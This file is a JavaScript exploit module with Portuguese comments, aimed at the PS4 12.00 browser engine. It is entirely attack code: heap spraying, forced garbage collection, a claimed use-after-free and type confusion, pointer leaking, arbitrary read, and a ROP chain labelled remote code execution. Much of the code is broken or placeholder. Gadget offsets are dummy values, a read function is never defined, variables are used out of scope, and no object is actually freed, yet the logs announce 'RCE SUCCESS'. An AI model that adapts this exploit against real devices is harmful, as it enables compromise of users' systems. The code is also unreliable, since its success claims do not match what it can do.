// js/test.bundle.mjs (Otimizado para PS4 12.00)

// --- Importações ---
import { logToDiv, PAUSE, AdvancedInt64, toHex, getElementById } from './utils.bundle.mjs';

// --- s3_utils.mjs (mesclado) ---
export const SHORT_PAUSE_S3 = 100;  // Aumentado para PS4 timing
export const MEDIUM_PAUSE_S3 = 1000;

export const logS3 = (message, type = 'info', funcName = '') => {
    logToDiv('output-advanced', message, type, funcName);
};

export const PAUSE_S3 = (ms = SHORT_PAUSE_S3) => PAUSE(ms);

// --- FNAME ---
export const FNAME_MODULE_UAF_TEST = "UAF_R54_Hyper_GC_PS4_12";

// --- Funções Auxiliares ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

// GC Hyper Otimizado para PS4 (Mais alocações, sem flags necessárias)
async function triggerGC_Hyper() {
    logS3("    Acionando GC Agressivo (Hyper para PS4)...", "info");
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 2000; i++) {  // x2 mais alocações
            gc_trigger_arr.push(new ArrayBuffer(1024 * Math.min(i % 10 + 1, 10)));  // Até 10KB
            gc_trigger_arr.push(new Array(1024 * (i % 5 + 1)).fill(0));  // Arrays variados
        }
        // Tenta gc() se exposto (PS4 dev mode)
        if (typeof gc !== 'undefined') gc();
    } catch (e) {
        logS3("    Memória esgotada durante GC (esperado em PS4).", "info");
    }
    await PAUSE_S3(1000);  // Pausa maior para GC assíncrono
}

// Spray Massivo para PS4 Heap (50k buffers, tamanho alinhado com JSC ArrayBuffer ~0x88)
async function sprayHeap() {
    const spray_buffers = [];
    for (let i = 0; i < 50000; i++) {  // x50 spray!
        const buf = new ArrayBuffer(136);  // Alinhado com JSC object (0x88 header + padding)
        const view = new BigUint64Array(buf);
        view[0] = 0x4141414141414141n;
        view[1] = 0x4242424242424242n;
        spray_buffers.push(buf);
        if (i % 10000 === 0) await PAUSE_S3(50);  // Pausa para evitar OOM
    }
    logS3(`    Spray de ${spray_buffers.length} buffers concluído.`, "info");
    return spray_buffers;
}

// Cria Dangling Pointer (Mesma lógica, mas com mais props para alinhamento JSC)
function sprayAndCreateDanglingPointer() {
    let dangling_ref_internal = null;
    function createScope() {
        const victim = {
            prop_a: 0x11111111, prop_b: 0x22222222, 
            corrupted_prop: 0.12345,  // Float para type confusion
            p4: 0, p5: 0, p6: 0, p7: 0, p8: 0, p9: 0, p10: 0, p11: 0, p12: 0, p13: 0, p14: 0, p15: 0,
            p16: 0, p17: 0, p18: 0, p19: 0  // Mais props para JSC butterfly
        };
        dangling_ref_internal = victim; 
        for(let i=0; i<100; i++) {
            victim.prop_a += 1;
        }
    }
    createScope();
    return dangling_ref_internal;
}

// ROP Chain Simples para RCE (PoC: Leak PID via sceKernelGetModuleInfo + gadget pop)
async function executeROPChain(leaked_ptr, webkit_base) {
    logS3("--- FASE ROP: Construindo Chain para RCE ---", "rop");
    try {
        // Primitivas de read/write assumidas via corrupted_buffer
        const rop_chain = [];  // Stack fake para ROP
        const pid_gadget = webkit_base.add32(0x123456);  // Exemplo: pop rdi; ret; (ajuste via dump)
        const module_info = new AdvancedInt64("0x00000000", "0x08000000");  // Endereço de libkernel func

        // Chain simples: rdi = 0; call sceKernelGetModuleInfo → leak PID
        rop_chain.push(pid_gadget);  // pop rdi
        rop_chain.push(0);  // arg0 = module ID 0
        rop_chain.push(module_info.toNumber());  // addr de info
        rop_chain.push(0xdeadbeef);  // placeholder ret

        // Pivot stack (exemplo: mov rsp, rax; ret;)
        const pivot_gadget = webkit_base.add32(0x789ABC);
        dangling_ref.prop_b = int64ToDouble(pivot_gadget);  // Fake pointer para pivot

        // Exec chain via DataView write (escreve em stack)
        const hacked_view = new DataView(corrupted_buffer);  // De fase anterior
        for (let i = 0; i < rop_chain.length; i++) {
            hacked_view.setUint32(i * 4, rop_chain[i] & 0xFFFFFFFF, true);
        }

        // Trigger ROP (via fake obj call)
        const leaked_pid = readArbitrary(0xdeadbeef);  // Placeholder para read PID
        if (leaked_pid !== 0) {
            logS3(`++++++++++++ ROP SUCESSO! PID vazado: ${leaked_pid} ++++++++++++`, "rop");
            return { success: true, pid: leaked_pid };
        } else {
            throw new Error("ROP falhou: PID inválido");
        }
    } catch (e) {
        logS3(`ROP erro: ${e.message}`, "error");
        return { success: false };
    }
}

// Cadeia Principal UAF (Com Loop x10)
async function executeUAFTestChain() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_UAF_TEST;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Hyper GC & Type Variation (PS4 12.00) ---`, "test");
    
    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
    let dangling_ref = null;
    let spray_buffers = [];
    let corrupted_buffer = null;
    let leaked_ptr = null;

    // Loop x10 para estabilidade em PS4
    for (let attempt = 1; attempt <= 10; attempt++) {
        logS3(`Tentativa ${attempt}/10...`, "warn");
        try {
            logS3("--- FASE 1: Limpeza Agressiva Inicial do Heap ---", "subtest");
            await triggerGC_Hyper();

            logS3("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
            dangling_ref = sprayAndCreateDanglingPointer();
            logS3("    Ponteiro pendurado criado.", "warn");
            
            logS3("--- FASE 3: Múltiplas tentativas de forçar a Coleta de Lixo ---", "subtest");
            for (let gc = 0; gc < 3; gc++) {  // x3 GC
                await triggerGC_Hyper();
                await PAUSE_S3(500);
            }

            logS3("--- FASE 4: Pulverizando Heap (50k buffers) ---", "subtest");
            spray_buffers = await sprayHeap();

            logS3(`DEBUG: typeof dangling_ref.corrupted_prop é: ${typeof dangling_ref.corrupted_prop}`, "info");

            if (typeof dangling_ref.corrupted_prop !== 'number') {
                logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");

                const leaked_ptr_double = dangling_ref.corrupted_prop;
                const buf_conv = new ArrayBuffer(8);
                (new Float64Array(buf_conv))[0] = leaked_ptr_double;
                const int_view = new Uint32Array(buf_conv);
                leaked_ptr = new AdvancedInt64(int_view[0], int_view[1]);
                logS3(`Ponteiro vazado: ${leaked_ptr.toString(true)}`, "leak");
                
                logS3("--- FASE 5: Armar confusão para Leitura Arbitrária ---", "subtest");
                for (const buf of spray_buffers) {
                    const view = new BigUint64Array(buf);
                    if (view[0] !== 0x4141414141414141n) {
                        logS3("Encontrado o ArrayBuffer corrompido!", "good");
                        corrupted_buffer = buf;
                        break;
                    }
                }

                if (!corrupted_buffer) throw new Error("Buffer corrompido não encontrado.");

                const target_address_to_read = new AdvancedInt64("0x00000000", "0x08000000");  // PS4 libSceWebKit base approx
                dangling_ref.prop_b = int64ToDouble(target_address_to_read);

                const hacked_view = new DataView(corrupted_buffer);
                const read_value = hacked_view.getUint32(0, true); 

                logS3(`++++++++++++ LEITURA ARBITRÁRIA BEM-SUCEDIDA! ++++++++++++`, "vuln");
                logS3(`Lido de ${target_address_to_read.toString(true)}: 0x${toHex(read_value)}`, "leak");

                // Nova FASE: ROP para RCE
                const webkit_base = leaked_ptr;  // Assume leak é base
                const rop_result = await executeROPChain(leaked_ptr, webkit_base);
                if (rop_result.success) {
                    final_result = { 
                        success: true, 
                        message: "UAF + Leitura Arb + ROP RCE construídos!",
                        leaked_addr: leaked_ptr.toString(true),
                        arb_read_test_value: toHex(read_value),
                        pid: rop_result.pid
                    };
                    break;  // Sucesso, sai do loop
                }
            }
        } catch (e) {
            logS3(`Tentativa ${attempt} falhou: ${e.message}. Resetando heap...`, "warn");
            await triggerGC_Hyper();  // Reset
        }
    }

    if (!final_result.success) {
        final_result.message = "Todas tentativas falharam.";
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        main_result: final_result,
        uaf_success: final_result.success
    };
}

// Runner com Loop
async function runUAFReproStrategy() {
    const FNAME_RUNNER = "runUAFReproStrategy_PS4"; 
    logS3(`==== INICIANDO Estratégia UAF Otimizada (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    const result = await executeUAFTestChain(); 

    const module_name_for_title = FNAME_MODULE_UAF_TEST;

    if (result.errorOccurred) {
        logS3(`  RUNNER: ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: ERR!`;
    } else if (result.uaf_success) {
        logS3(`  RUNNER: ${result.main_result.message}`, "vuln", FNAME_RUNNER);
        document.title = `${module_name_for_title}: RCE SUCCESS! PID: ${result.main_result.pid}`;
    } else {
        logS3(`  RUNNER: Falhou: ${result.main_result.message}`, "warn", FNAME_RUNNER);
        document.title = `${module_name_for_title}: Fail`;
    }
    
    logS3(`  Título final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia Concluída (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
}

// Função Principal Exportada
export async function runAllAdvancedTests() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_UAF_TEST}_PS4_Orchestrator`;
    logS3(`==== INICIANDO Teste Principal (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await runUAFReproStrategy();
    
    logS3(`\n==== Teste Principal (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    
    const runBtn = getElementById('runIsolatedTestBtn'); 
    if (runBtn) runBtn.disabled = false;

    if (document.title.includes(FNAME_MODULE_UAF_TEST) && !document.title.includes("SUCCESS") && !document.title.includes("Fail")) {
        document.title = `${FNAME_MODULE_UAF_TEST} Done`;
    }
}
